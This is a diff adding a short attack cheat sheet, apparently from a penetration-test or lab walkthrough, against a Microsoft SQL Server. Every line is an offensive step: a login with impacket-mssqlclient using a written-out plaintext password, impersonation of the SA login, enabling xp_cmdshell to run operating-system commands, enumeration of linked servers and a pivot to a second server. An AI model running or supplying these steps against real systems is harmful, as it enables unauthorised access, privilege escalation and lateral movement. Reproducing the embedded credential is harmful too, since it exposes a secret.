@@ -1,0 +1,17 @@
+# Access SQL server using password
+impacket-mssqlclient zabbix:'rDhHbBEfh35sMbkY'@zph-svrsql01.zsm.local
+
+# Privilege escalation to SA
+SQL (zabbix  guest@master)> exec_as_login SA
+
+# Enable xp_cmdshell
+SQL (sa  dbo@master)> enable_xp_cmdshell
+
+# RCE
+SQL (sa  dbo@master)> xp_cmdshell whoami
+
+# Watch for linked SQL servers
+SQL (sa  dbo@master)> enum_links
+
+# Use ZSM-SVRCSQL02
+SQL (sa  dbo@master)> use_link "ZSM-SVRCSQL02"
